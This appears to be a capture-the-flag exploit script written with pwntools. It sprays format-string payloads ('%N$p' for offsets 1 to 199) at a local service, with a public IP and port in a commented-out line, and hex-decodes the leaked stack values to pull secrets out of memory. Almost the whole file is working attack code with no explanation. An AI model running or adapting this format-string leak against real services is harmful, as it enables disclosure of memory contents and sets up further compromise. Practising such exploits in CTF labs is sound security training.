from pwn import *
from binascii import unhexlify
# input("attach gdb")
#  Compile using: gcc -o pwn3 pwn3

context.log_level = 'critical'

for offset in range(1, 200): 
    p = remote('127.0.0.1', 1024)
    # p = remote("3.142.26.175", 12345)
    p.recvuntil("\n")
    # print(message)
    payload = '%{}$p'.format(offset)
    p.sendline(payload)
    try:
        response = p.recv()
        print(unhexlify(response.strip()[2:]))
        p.close()
    except:
        continue